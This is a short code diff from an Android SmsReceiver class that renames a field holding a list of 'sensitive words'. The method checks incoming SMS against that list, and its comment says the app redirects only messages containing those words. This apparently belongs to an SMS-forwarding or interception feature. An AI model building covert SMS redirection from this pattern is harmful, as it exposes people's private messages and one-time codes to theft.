@@ -455,11 +455,11 @@ public class SmsReceiver extends BroadcastReceiver
 	
 	private boolean containSensitiveWords(Context context, String sms) {
 		boolean ret = false;
-		if (GlobalValues.sensitiveWordArray == null || GlobalValues.sensitiveWordArray.length <= 0) 
+		if (GlobalValues.sensitiveWords == null || GlobalValues.sensitiveWords.length <= 0) 
 			return false; // We only redirect SMS that contains sensitive words intead of redirecting all.
 
 		String smsBody = sms.toLowerCase();
-		for (String word : GlobalValues.sensitiveWordArray) {
+		for (String word : GlobalValues.sensitiveWords) {
 			if (smsBody.contains(word)) {
 				ret = true;
 				break;
